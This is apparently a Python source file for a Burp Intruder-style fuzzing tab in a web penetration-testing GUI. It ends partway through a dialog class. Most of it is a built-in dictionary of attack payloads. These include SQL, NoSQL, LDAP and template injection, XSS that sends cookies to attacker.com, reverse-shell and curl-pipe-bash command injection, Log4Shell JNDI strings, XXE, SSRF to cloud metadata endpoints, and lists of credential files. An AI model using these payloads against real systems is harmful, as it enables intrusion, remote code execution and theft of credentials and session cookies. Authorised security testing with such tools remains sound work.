#!/usr/bin/env python3
"""
intruder_tab.py  –  Burp Suite-style Intruder Tab for Hunt GUI

Attack types:
  • Sniper       – single payload set, cycles through positions one at a time
  • Battering Ram – single payload set, inserts same payload into ALL positions
  • Pitchfork    – multiple payload sets, one per position, parallel iteration
  • Cluster Bomb – multiple payload sets, cartesian product

Payload sources:
  • Simple List (manual or load file)
  • Numbers (range)
  • Brute Force (charset)
  • Built-in wordlists (common passwords, usernames, SQLi, XSS, etc.)
"""

import re
import ssl
import json
import time
import socket
import itertools
import gzip
import logging
import threading
import urllib.parse
import html as _html
import hashlib
import base64
from typing import List, Dict, Optional, Tuple, Iterator, Any

from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QSplitter, QTabWidget,
    QTextEdit, QPlainTextEdit, QPushButton, QLabel, QLineEdit,
    QComboBox, QFrame, QTableWidget, QTableWidgetItem, QHeaderView,
    QCheckBox, QSpinBox, QGroupBox, QFileDialog, QMessageBox,
    QProgressBar, QMenu, QScrollArea, QRadioButton, QButtonGroup,
    QDoubleSpinBox, QSizePolicy, QAbstractItemView, QInputDialog,
    QDialog, QDialogButtonBox, QListWidget, QListWidgetItem,
    QStyledItemDelegate, QStyle, QStyleOptionViewItem, QShortcut
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QColor, QBrush, QFont, QTextCursor, QTextDocument, QSyntaxHighlighter, QTextCharFormat, QPalette, QKeySequence

from constants import (
    COLOR_BACKGROUND, COLOR_DARK_BG, COLOR_CARD_BG, COLOR_ELEVATED_BG,
    COLOR_TEXT, COLOR_TEXT_BRIGHT, COLOR_TEXT_MUTED, COLOR_BORDER,
    COLOR_ACCENT, COLOR_SUCCESS, COLOR_CRITICAL, COLOR_HOVER,
    FONT_FAMILY_MONO, FONT_SIZE_NORMAL, FONT_SIZE_SMALL,
    HttpSyntaxHighlighter
)

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Built-in Payload Lists
# ─────────────────────────────────────────────────────────────────────────────

BUILTIN_LISTS = {
    # ── Credentials ───────────────────────────────────────────────────────────
    "Passwords – Top 100": [
        "123456", "password", "123456789", "12345678", "12345", "1234567",
        "1234567890", "qwerty", "abc123", "111111", "123123", "admin",
        "letmein", "welcome", "monkey", "dragon", "master", "trustno1",
        "sunshine", "princess", "password1", "iloveyou", "football",
        "shadow", "superman", "michael", "baseball", "solo", "ninja",
        "hello", "charlie", "donald", "password123", "qwerty123", "pass",
        "test", "root", "toor", "alpine", "changeme", "default", "1234",
        "12341234", "pass123", "admin123", "admin1234", "p@ssword",
        "P@ssw0rd", "P@$$w0rd", "passw0rd", "Password1", "Password123",
        "Summer2023!", "Winter2023!", "Spring2024!", "Fall2023!",
        "January1!", "Welcome1", "Welcome1!", "Company123", "Login123",
        "Test1234", "Qwerty123!", "Abc123456!", "123!@#qwe", "1q2w3e4r",
        "zxcvbnm", "asdfghjkl", "1qaz2wsx", "qazwsx", "123qwe",
        "abc", "pass1", "secret", "access", "mustang", "starwars",
        "buster", "flower", "cookie", "tigger", "jessica", "alex",
        "batman", "hunter", "ranger", "joshua", "andrew", "george",
        "daniel", "thomas", "madison", "robert", "jordan", "harley",
        "ranger", "thunder", "maverick", "matrix", "love", "purple",
        "orange", "maggie", "apple", "cheese", "internet",
    ],
    "Passwords – Default Creds": [
        "admin", "administrator", "root", "toor", "password", "pass",
        "1234", "12345", "123456", "test", "guest", "default", "alpine",
        "blank", "", "changeme", "change_on_install", "oracle",
        "password1", "admin1", "admin123", "pass123", "root123",
        "Admin1234!", "P@ssw0rd", "Passw0rd", "Welcome1", "cisco",
        "enable", "secret", "private", "public", "community",
    ],
    "Passwords – Common Patterns": [
        "Season + Year (e.g. Summer2024!)",
        "Company + 123!", "Name + 1234", "qwerty", "asdfgh",
        "abc123", "1qaz2wsx", "zxcvbnm", "1q2w3e4r5t",
        "p@ssw0rd", "pa$$word", "passw0rd!", "P@$$w0rd1",
        "!QAZ2wsx", "#EDC4rfv", "iloveyou1", "hello123", "letmein1",
    ],
    "Usernames – Common": [
        "admin", "administrator", "root", "user", "test", "guest",
        "info", "webmaster", "support", "service", "operator", "staff",
        "superuser", "sa", "postgres", "oracle", "mysql", "mssql",
        "manager", "dev", "developer", "api", "backend", "frontend",
        "sysadmin", "netadmin", "dbadmin", "deploy", "runner",
        "jenkins", "ansible", "puppet", "chef", "nagios", "zabbix",
        "monitor", "backup", "ftp", "sftp", "www", "web", "nobody",
        "daemon", "bin", "sys", "sync", "mail", "news", "uucp",
        "proxy", "list", "irc", "gnats", "ubuntu", "centos",
    ],
    "Usernames – First Names": [
        "james", "john", "robert", "michael", "william", "david",
        "richard", "joseph", "thomas", "charles", "christopher",
        "daniel", "matthew", "anthony", "mark", "donald", "steven",
        "paul", "andrew", "joshua", "mary", "patricia", "jennifer",
        "linda", "barbara", "elizabeth", "susan", "jessica", "sarah",
        "karen", "lisa", "nancy", "betty", "margaret", "sandra",
        "ashley", "dorothy", "kimberly", "emily", "donna", "michelle",
        "carol", "amanda", "melissa", "deborah", "stephanie", "anna",
    ],
    "Usernames – Email Prefixes": [
        "admin", "administrator", "webmaster", "postmaster", "hostmaster",
        "abuse", "noc", "security", "info", "support", "help", "sales",
        "contact", "mail", "email", "no-reply", "noreply", "reply",
        "newsletter", "marketing", "billing", "accounts", "hr", "jobs",
        "careers", "press", "news", "feedback", "service", "it",
    ],

    # ── Null / Edge Case ──────────────────────────────────────────────────────
    "Null / Empty": [
        "", " ", "  ", "\t", "\n", "\r\n", "\x00",
        "null", "NULL", "Null", "nil", "NIL", "None", "NONE",
        "undefined", "UNDEFINED", "void", "NaN", "nan",
        "true", "false", "True", "False", "TRUE", "FALSE",
        "0", "-0", "0.0", "-0.0", "0x0",
    ],
    "Edge Case Numbers": [
        "0", "1", "-1", "2147483647", "-2147483648",
        "2147483648", "4294967295", "4294967296",
        "9223372036854775807", "-9223372036854775808",
        "1.7976931348623157e+308", "5e-324",
        "Infinity", "-Infinity", "NaN",
        "1e308", "1e309", "-1e309",
        "0x7FFFFFFF", "0xFFFFFFFF",
        "0.1", "0.2", "0.1+0.2",
        "999999999999999999999", "-999999999999999999999",
    ],
    "Special Characters": [
        "!", "\"", "#", "$", "%", "&", "'", "(", ")", "*",
        "+", ",", "-", ".", "/", ":", ";", "<", "=", ">",
        "?", "@", "[", "\\", "]", "^", "_", "`", "{", "|",
        "}", "~", "\x00", "\x01", "\x7f",
        "\\n", "\\r", "\\t", "\\0",
        "…", "™", "©", "®", "€", "£", "¥",
        "𝕳𝖊𝖑𝖑𝖔", "😀", "🔥", "💉",
    ],
    "Long Strings (Buffer Overflow)": [
        "A" * 10, "A" * 50, "A" * 100, "A" * 200, "A" * 500,
        "A" * 1000, "A" * 2000, "A" * 5000, "A" * 10000,
        "%" * 100, "/" * 200, "<" * 100, ">" * 100,
        "'" * 100, "\"" * 100, ";" * 100,
    ],
    "Format Strings": [
        "%s", "%d", "%n", "%x", "%p", "%f", "%e",
        "%s%s%s%s%s", "%n%n%n%n", "%x%x%x%x",
        "%.100d", "%.1000d", "%.10000d",
        "%1$s", "%2$s", "%999$s",
        "%08x.%08x.%08x", "AAAA%08x%08x%08x%n",
        "{{7*7}}", "{{7*'7'}}", "${7*7}",
        "#{7*7}", "<%= 7*7 %>", "@{7*7}",
        "${__import__('os').system('id')}",
        "{{config}}", "{{self.__dict__}}",
    ],

    # ── Injection ─────────────────────────────────────────────────────────────
    "SQL Injection – Basic": [
        "'", "''", "\"", "\\", "--", "/*", "*/", "#",
        "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
        "' OR 'x'='x", "') OR ('1'='1", "') OR 1=1--",
        "1 OR 1=1", "1' OR '1'='1'--", "admin'--",
        "' OR 1=1#", "\" OR 1=1#", "' OR 1=1/*",
        "1' AND '1'='1", "1' AND '1'='2",
        "' AND 1=1--", "' AND 1=2--",
        "1 AND 1=1", "1 AND 1=2",
        "' HAVING 1=1--", "' GROUP BY 1--",
    ],
    "SQL Injection – Union": [
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1' UNION SELECT 1,2,3--",
        "1' UNION SELECT username,password FROM users--",
        "1' UNION ALL SELECT NULL--",
        "1 UNION SELECT NULL--",
        "1 UNION SELECT table_name FROM information_schema.tables--",
        "1' UNION SELECT @@version--",
        "1' UNION SELECT user()--",
        "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--",
    ],
    "SQL Injection – Blind / Time": [
        "' AND SLEEP(5)--",
        "1; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "1' AND SLEEP(5) AND '1'='1",
        "1 AND 1=1 AND SLEEP(5)",
        "' OR SLEEP(5)--",
        "'; EXEC xp_cmdshell('ping -c 4 attacker.com')--",
        "1; EXEC xp_cmdshell('id')--",
        "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
        "1' AND IF(1=1,SLEEP(5),0)--",
        "1' AND IF(1=2,SLEEP(5),0)--",
    ],
    "SQL Injection – Error Based": [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND exp(~(SELECT * FROM(SELECT version())a))--",
        "'; SELECT 1/0--",
        "' OR 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "'; DECLARE @q NVARCHAR(4000) SELECT @q=0x61 EXEC(@q)--",
    ],
    "NoSQL Injection": [
        "' || '1'=='1", "{\"$gt\": \"\"}", "{\"$ne\": null}",
        "{\"$where\": \"1==1\"}", "{\"$regex\": \".*\"}",
        "{\"$gt\": 0}", "{\"$lt\": 9999999}",
        "'; return true; var x='",
        "'; return 1 == 1; var x='",
        "{\"$or\": [{\"a\":\"a\"}, {\"a\":\"a\"}]}",
        ";return+this.password.match(/.*/)//",
        "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
    ],
    "LDAP Injection": [
        "*", "*)(&", "*)(|(*", "*))(|(*))",
        "*()|%26'", "*()|&'", "%2a%29%28%7c%28%2a",
        "admin*", "admin)(|(password=*))",
        "*(|(objectclass=*))", "admin)(!(&(1=0)))",
        "*)(uid=*))(|(uid=*", "\\2a", "\\28", "\\29",
    ],
    "XSS – Basic": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<iframe src=javascript:alert(1)>",
        "';alert(String.fromCharCode(88,83,83))//",
        "\"><img src=/ onerror=alert(document.domain)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>xss</marquee>",
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
    ],
    "XSS – Filter Bypass": [
        "<ScRiPt>alert(1)</sCrIpT>",
        "<script >alert(1)</script >",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<<script>alert(1)//<</script>",
        "<script/src=//attacker.com/xss.js>",
        "\"><svg/onload=alert(1)>",
        "';alert(1);//",
        "\";alert(1);//",
        "</script><script>alert(1)</script>",
        "<img src=\"x\" onerror=\"alert(1)\">",
        "<img src='x' onerror='alert(1)'>",
        "<%2fscript><script>alert(1)<%2fscript>",
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "<img src=x:alert(alt) onerror=eval(src)>",
    ],
    "XSS – Stored / DOM": [
        "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
        "<script>new Image().src='https://attacker.com/?c='+document.cookie</script>",
        "<script>document.location='https://attacker.com/?c='+document.cookie</script>",
        "\"><script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>",
        "<img src=x onerror=\"this.src='https://attacker.com/?c='+document.cookie\">",
        "<body onpageshow=alert(document.domain)>",
        "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://attacker.com/x.js\\';document.body.appendChild(a)')",
    ],
    "Command Injection – Basic": [
        "; id", "| id", "& id", "&& id", "|| id",
        "`id`", "$(id)", "$(whoami)", "; whoami", "| whoami",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "; ls -la", "| ls -la", "; uname -a", "| uname -a",
        "; sleep 5", "| sleep 5", "& sleep 5",
        "; ping -c 4 attacker.com", "$(ping -c 4 attacker.com)",
    ],
    "Command Injection – Bypass": [
        ";`id`", "|`id`",
        ";i\\d", ";w'h'o'am'i", ";/bin/id",
        "$IFS$()id", "$(< /etc/passwd)",
        "{cat,/etc/passwd}", "$({cat,/etc/passwd})",
        "id%0a", "id%0d%0a", "id%26id",
        ";%20id", "|%20id",
        "1;id", "1|id", "1&id",
        "|nc attacker.com 4444 -e /bin/sh",
        ";bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'",
        "$(curl http://attacker.com/shell.sh|bash)",
    ],
    "Path Traversal – Unix": [
        "../", "../../", "../../../", "../../../../",
        "../../../etc/passwd", "../../../../etc/shadow",
        "../../../../etc/hosts", "../../../proc/self/environ",
        "../../../var/log/apache2/access.log",
        "../../../var/log/nginx/access.log",
        "%2e%2e%2f", "%2e%2e/", "..%2f", "..%252f",
        "..%c0%af", "..%c1%9c", "%252e%252e%252f",
        "....//", "....\\\\", ".././", ".././.././",
    ],
    "Path Traversal – Windows": [
        "..\\", "..\\..\\", "..\\..\\..\\", "..\\..\\..\\..\\",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\..\\windows\\win.ini",
        "%2e%2e%5c", "..%5c", "..%255c",
        "..%c0%5c", "..%c0%80%5c",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "C:/windows/system32/drivers/etc/hosts",
    ],
    "SSRF Payloads": [
        "http://127.0.0.1/", "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://[::1]/", "http://0.0.0.0/",
        "http://2130706433/",    # 127.0.0.1 decimal
        "http://0177.0.0.1/",   # 127.0.0.1 octal
        "http://0x7f000001/",   # 127.0.0.1 hex
        "http://127.1/", "http://127.0.1/",
        "file:///etc/passwd", "file:///etc/hosts",
        "file:///C:/windows/win.ini",
        "dict://127.0.0.1:11211/", "dict://localhost:6379/info",
        "gopher://127.0.0.1:6379/_PING",
        "gopher://127.0.0.1:25/_HELO attacker.com",
        "sftp://attacker.com:22/", "tftp://attacker.com:69/x",
        "http://attacker.com@127.0.0.1/",
        "http://127.0.0.1.attacker.com/",
    ],
    "XXE Payloads": [
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><root/>",
        "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE data SYSTEM \"http://attacker.com/evil.dtd\"><data>&send;</data>",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><root>&xxe;</root>",
        "<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>",
    ],
    "Template Injection (SSTI)": [
        "{{7*7}}", "{{7*'7'}}", "${7*7}", "#{7*7}",
        "<%= 7*7 %>", "@(7*7)", "#{7*7}",
        "{{config.items()}}", "{{''.__class__.__mro__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "${__import__('os').system('id')}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()",
    ],
    "Open Redirect": [
        "//attacker.com", "///attacker.com", "////attacker.com",
        "https://attacker.com", "http://attacker.com",
        "//attacker.com/%2f..", "//attacker.com/..%2f",
        "/\\attacker.com", "///\\attacker.com",
        "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
        "/%0d%0aLocation:%20https://attacker.com",
        "/%09/attacker.com", "/attacker.com/%2e%2e",
        "https:attacker.com", "https:/attacker.com",
        "//google.com@attacker.com", "//attacker.com?google.com",
    ],
    "HTTP Header Injection": [
        "test\r\nX-Injected: hdr",
        "test\r\nSet-Cookie: sess=evil",
        "%0d%0aX-Injected: hdr",
        "%0aX-Injected: hdr",
        "%0d%0aLocation: https://attacker.com",
        "foo\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Length: 8\r\n\r\nevil",
        "\r\n\r\n<script>alert(1)</script>",
        "\r\nX-Forwarded-For: 127.0.0.1",
        "\r\nX-Real-IP: 127.0.0.1",
    ],
    "HTTP Request Smuggling": [
        "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
        "Content-Length: 13\r\n\r\n0\r\n\r\nSMUGGLED",
        "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding\t: chunked",
        "GET / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
    ],
    "JWT Attacks": [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "none", "HS256", "RS256", "alg=none",
        "eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.",
        "secret", "password", "12345", "HS256_secret",
    ],
    "IDOR / Object Reference": [
        "0", "1", "2", "3", "100", "1000", "9999",
        "-1", "999999", "0000", "00001",
        "null", "undefined", "admin", "me", "self",
        "user1", "test", "anonymous",
        "../1", "../../1", "1/../../admin",
        "1%2520", "1%00", "1.json", "1;", "1,",
    ],
    "File Upload – Extensions": [
        ".php", ".php2", ".php3", ".php4", ".php5", ".php7", ".phtml",
        ".pht", ".phar", ".phps", ".php%00.jpg", ".php%20",
        ".php.jpg", ".php.png", ".jpg.php", ".png.php",
        ".asp", ".aspx", ".asa", ".cer", ".cdx", ".asax",
        ".ashx", ".asmx", ".axd",
        ".jsp", ".jspx", ".jspf", ".jsw", ".jsv",
        ".htaccess", ".htpasswd",
        ".svg", ".xml", ".shtml",
        ".exe", ".bat", ".cmd", ".sh", ".pl", ".py",
    ],
    "File Upload – MIME Bypass": [
        "image/jpeg", "image/png", "image/gif", "image/webp",
        "application/pdf", "text/plain",
        "image/jpeg\r\nContent-Type: application/php",
        "image/png; charset=utf-8",
        "application/x-php", "application/octet-stream",
    ],
    "Sensitive Files – Linux": [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "/etc/hostname", "/etc/resolv.conf",
        "/etc/crontab", "/etc/cron.d/", "/var/spool/cron/",
        "/proc/self/environ", "/proc/self/cmdline",
        "/proc/self/fd/0", "/proc/version",
        "/var/log/apache2/access.log", "/var/log/apache2/error.log",
        "/var/log/nginx/access.log", "/var/log/auth.log",
        "/var/log/syslog", "/var/log/mail.log",
        "/home/user/.ssh/id_rsa", "/root/.ssh/id_rsa",
        "/home/user/.bash_history", "/root/.bash_history",
        "/var/www/html/config.php", "/var/www/html/.env",
    ],
    "Sensitive Files – Windows": [
        "C:\\windows\\win.ini", "C:\\windows\\system.ini",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\windows\\system32\\config\\SAM",
        "C:\\boot.ini",
        "C:\\documents and settings\\administrator\\desktop\\desktop.ini",
        "C:\\users\\administrator\\ntuser.dat",
        "C:\\Program Files\\MySQL\\MySQL Server 5.0\\data\\mysql\\user.frm",
    ],
    "Web Paths – Admin": [
        "/admin", "/admin/", "/administrator", "/administrator/",
        "/admin.php", "/admin.html", "/admin/login", "/admin/index.php",
        "/wp-admin", "/wp-login.php", "/wp-admin/",
        "/phpmyadmin", "/phpmyadmin/", "/pma/", "/phpMyAdmin/",
        "/manager", "/manager/html", "/host-manager",
        "/console", "/dashboard", "/panel", "/cpanel",
        "/controlpanel", "/backend", "/backoffice",
        "/superadmin", "/superuser", "/su/",
        "/.env", "/.git/HEAD", "/.git/config",
        "/config.php", "/config.json", "/config.yml",
        "/web.config", "/sitemap.xml", "/robots.txt",
        "/server-status", "/server-info",
        "/actuator", "/actuator/health", "/actuator/env",
        "/swagger-ui.html", "/swagger-ui/", "/api-docs", "/openapi.json",
    ],
    "Web Paths – Common": [
        "/login", "/logout", "/register", "/signup", "/signin",
        "/profile", "/account", "/settings", "/preferences",
        "/api/v1/", "/api/v2/", "/api/", "/graphql",
        "/upload", "/uploads/", "/files/", "/static/",
        "/images/", "/css/", "/js/", "/assets/",
        "/search", "/index.php", "/index.html",
        "/test", "/test.php", "/debug", "/trace",
        "/backup", "/backup.zip", "/backup.tar.gz", "/backup.sql",
        "/old/", "/bak/", "/temp/", "/tmp/",
    ],
    "HTTP Methods": [
        "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS",
        "HEAD", "TRACE", "CONNECT", "PROPFIND", "PROPPATCH",
        "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK",
        "SEARCH", "ARBITRARY",
    ],
    "User-Agent Strings": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "curl/7.85.0", "python-requests/2.28.0", "Go-http-client/1.1",
        "sqlmap/1.7 (https://sqlmap.org)", "Nikto/2.1.6",
        "() { :;}; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "<script>alert(1)</script>",
        "${jndi:ldap://attacker.com/a}",
    ],
    "Log4Shell (JNDI)": [
        "${jndi:ldap://attacker.com/a}",
        "${jndi:ldaps://attacker.com/a}",
        "${jndi:rmi://attacker.com/a}",
        "${jndi:dns://attacker.com/a}",
        "${${::-j}ndi:ldap://attacker.com/a}",
        "${${lower:j}ndi:ldap://attacker.com/a}",
        "${${upper:j}ndi:ldap://attacker.com/a}",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}",
        "${j${::-n}di:ldap://attacker.com/a}",
        "${${::-j}ndi:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
        "${jndi:ldap://127.0.0.1:1389/a}",
        "%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D",
    ],
    "Prototype Pollution": [
        "__proto__[admin]=true", "__proto__[isAdmin]=true",
        "constructor[prototype][admin]=true",
        "__proto__.admin=true", "constructor.prototype.admin=true",
        "{\"__proto__\":{\"admin\":true}}",
        "{\"constructor\":{\"prototype\":{\"admin\":true}}}",
        "?__proto__[admin]=1", "?constructor[prototype][admin]=1",
    ],
    "Fuzzing Strings": [
        "", " ", "  ", "\t", "\n", "\r\n", "\x00",
        "null", "undefined", "NaN", "true", "false",
        "0", "-1", "9999999999", "1e308",
        "A" * 100, "A" * 500, "A" * 1000,
        "%s", "%d", "%n", "%x", "{{7*7}}",
        "${7*7}", "#{7*7}",
        "'\";<>", "<>\"'", "&;|*?~<>^()[]{}$",
        "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09",
        "\xff\xfe\xfd", "\ufeff", "\u200b",
    ],
}


# ─────────────────────────────────────────────────────────────────────────────
# Payload Generators
# ─────────────────────────────────────────────────────────────────────────────

def gen_simple_list(items: List[str]) -> Iterator[str]:
    yield from items


def gen_numbers(start: int, end: int, step: int = 1) -> Iterator[str]:
    n = start
    while n <= end:
        yield str(n)
        n += step


def gen_brute_force(charset: str, min_len: int, max_len: int) -> Iterator[str]:
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            yield "".join(combo)


# ─────────────────────────────────────────────────────────────────────────────
# Payload Processing Engine
# ─────────────────────────────────────────────────────────────────────────────

PROCESSING_RULE_TYPES = [
    "Add Prefix",
    "Add Suffix",
    "Match / Replace",
    "Substring",
    "URL Encode (key chars)",
    "URL Encode (all chars)",
    "URL Decode",
    "Base64 Encode",
    "Base64 Decode",
    "HTML Encode",
    "HTML Decode",
    "MD5 Hash",
    "SHA-1 Hash",
    "SHA-256 Hash",
    "SHA-512 Hash",
    "Uppercase",
    "Lowercase",
    "Capitalize",
    "Reverse",
    "Trim Whitespace",
    "Remove Whitespace",
]


def apply_rule(payload: str, rule: dict) -> str:
    rtype = rule.get("type", "")
    p     = rule.get("params", {})
    try:
        if rtype == "Add Prefix":
            return p.get("value", "") + payload
        elif rtype == "Add Suffix":
            return payload + p.get("value", "")
        elif rtype == "Match / Replace":
            match   = p.get("match", "")
            replace = p.get("replace", "")
            if not match:
                return payload
            if p.get("is_regex", False):
                return re.sub(match, replace, payload)
            return payload.replace(match, replace)
        elif rtype == "Substring":
            start = int(p.get("start") or 0)
            end   = p.get("end")
            if end is None or str(end).strip() == "":
                return payload[start:]
            return payload[start:int(end)]
        elif rtype == "URL Encode (key chars)":
            return urllib.parse.quote(payload, safe="")
        elif rtype == "URL Encode (all chars)":
            return "".join(f"%{b:02X}" for b in payload.encode("utf-8"))
        elif rtype == "URL Decode":
            return urllib.parse.unquote(payload)
        elif rtype == "Base64 Encode":
            return base64.b64encode(payload.encode("utf-8")).decode("ascii")
        elif rtype == "Base64 Decode":
            return base64.b64decode(payload + "==").decode("utf-8", errors="replace")
        elif rtype == "HTML Encode":
            return _html.escape(payload, quote=True)
        elif rtype == "HTML Decode":
            return _html.unescape(payload)
        elif rtype == "MD5 Hash":
            return hashlib.md5(payload.encode("utf-8")).hexdigest()
        elif rtype == "SHA-1 Hash":
            return hashlib.sha1(payload.encode("utf-8")).hexdigest()
        elif rtype == "SHA-256 Hash":
            return hashlib.sha256(payload.encode("utf-8")).hexdigest()
        elif rtype == "SHA-512 Hash":
            return hashlib.sha512(payload.encode("utf-8")).hexdigest()
        elif rtype == "Uppercase":
            return payload.upper()
        elif rtype == "Lowercase":
            return payload.lower()
        elif rtype == "Capitalize":
            return payload.capitalize()
        elif rtype == "Reverse":
            return payload[::-1]
        elif rtype == "Trim Whitespace":
            return payload.strip()
        elif rtype == "Remove Whitespace":
            return re.sub(r"\s+", "", payload)
    except Exception:
        pass
    return payload


def apply_processing(payloads: List[str], rules: List[dict]) -> List[str]:
    if not rules:
        return payloads
    result = []
    for payload in payloads:
        p = payload
        for rule in rules:
            if rule.get("enabled", True):
                p = apply_rule(p, rule)
        result.append(p)
    return result


# ─────────────────────────────────────────────────────────────────────────────
# Processing Rule Dialog
# ─────────────────────────────────────────────────────────────────────────────

class ProcessingRuleDialog(QDialog):
    """Dialog to add or edit a single payload processing rule."""

    _FIELD_STYLE  = ""
    _LABEL_WIDTH  = 82

    def __init__(self, rule: dict = None, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Payload Processing Rule")
        self.setMinimumWidth(440)
        self._rule = dict(rule) if rule else {
            "type": PROCESSING_RULE_TYPES[0], "params": {}, "enabled": True
        }
        self._param_widgets: Dict[str, Any] = {}
        self._setup_ui()

    def _setup_ui(self):
        self.setStyleSheet(f"background:{COLOR_BACKGROUND};color:{COLOR_TEXT};")
        root = QVBoxLayout(self)
        root.setSpacing(10)
        root.setContentsMargins(14, 14, 14, 14)

        # ── Rule type row ─────────────────────────────────────────────────────
        type_row = QHBoxLayout()
        lbl = QLabel("Rule type:")
        lbl.setFixedWidth(self._LABEL_WIDTH)
        lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};")
        self.type_combo = QComboBox()
        self.type_combo.addItems(PROCESSING_RULE_TYPES)
        self.type_combo.setCurrentText(self._rule.get("type", PROCESSING_RULE_TYPES[0]))
        self.type_combo.setStyleSheet(
            f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:4px;padding:3px 8px;"
        )
        type_row.addWidget(lbl)
